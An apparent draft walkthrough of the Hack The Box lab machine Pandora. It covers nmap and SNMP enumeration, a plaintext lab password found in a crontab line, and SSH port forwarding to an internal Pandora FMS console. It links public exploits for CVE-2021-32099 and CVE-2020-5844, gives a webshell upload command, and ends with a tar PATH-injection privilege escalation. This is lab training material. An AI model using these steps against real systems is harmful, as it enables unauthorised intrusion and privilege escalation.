---
title: HTB Pandora (2024)
author: kei5uke
draft: true
description: Writeup for HTB Pandora (2024)
tags:
  - linux
  - writeup
---

Pandora

# Enumeration

```
nmap 10.129.99.51 -sC -sV -A -T4 -p- --min-rate 10000 -oN nmap_tcp.txt
Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org/) ) at 2024-07-14 20:40 EDT
Nmap scan report for 10.129.99.51
Host is up (0.028s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
No exact OS matches for host
```

```
nmap -sU -T4 --top-port=100 10.129.99.51 -oN nmap_udp.txt 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-14 20:42 EDT
Warning: 10.129.99.51 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.99.51
Host is up (0.027s latency).
Not shown: 81 closed udp ports (port-unreach)
PORT      STATE         SERVICE
17/udp    open|filtered qotd
19/udp    open|filtered chargen
53/udp    open|filtered domain
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
120/udp   open|filtered cfdptkt
138/udp   open|filtered netbios-dgm
161/udp   open          snmp
427/udp   open|filtered svrloc
520/udp   open|filtered route
623/udp   open|filtered asf-rmcp
1026/udp  open|filtered win-rpc
5000/udp  open|filtered upnp
5632/udp  open|filtered pcanywherestat
32815/udp open|filtered unknown
49154/udp open|filtered unknown
49191/udp open|filtered unknown
49192/udp open|filtered unknown
49194/udp open|filtered unknown
```

## HTTP 80

panda.htb

### DNS Subdomain

`ffuf -w /usr/share/dnsrecon/namelist.txt -H "Host:FUZZ.panda.htb" -u [http://panda.htb](http://panda.htb/)` 

## SNMP

`snmpbulkwalk -c public -v2c 10.129.99.51 .`

`snmpbulkwalk -c public -v2c 10.129.99.51 .1`

`snmpbulkwalk -c public -v2c 10.129.99.51 .1 | grep 'STRING:’`

Found Daniel’s credential

![[HTB Pandora (2024) - Untitled.png]]

## Shell

`ssh daniel@panda.htb`

/etc/crontab

/bin/sh -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23’

/var/www/pandora/pandora_console/godmode/groups/credential_store.php

I found that there is internal webpage is running 

`ssh -L 8000:localhost:80 [daniel@10.129.198.62](mailto:daniel@10.129.198.62)`

And access to 127.0.0.1:8000

Found PandoraConsole page

![[HTB Pandora (2024) - Untitled 1.png]]

https://sploitus.com/exploit?id=100B9151-5B50-532E-BF69-74864F32DB02

[https://github.com/l3eol3eo/CVE-2021-32099_SQLi](https://github.com/l3eol3eo/CVE-2021-32099_SQLi)

Changed admin password to password123

![[HTB Pandora (2024) - Untitled 2.png]]

[https://github.com/UNICORDev/exploit-CVE-2020-5844](https://github.com/UNICORDev/exploit-CVE-2020-5844)

`python3 [exploit-CVE-2020-5844.py](http://exploit-cve-2020-5844.py/) -t 127.0.0.1 8000 -u admin -w shell.php`

and have them download reverse shell and got matt shell

## Shell as Matt

/usr/bin/pandora_backup

strings pandora_backup

tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*

THIS tar in the code allows you to execute PATH injection
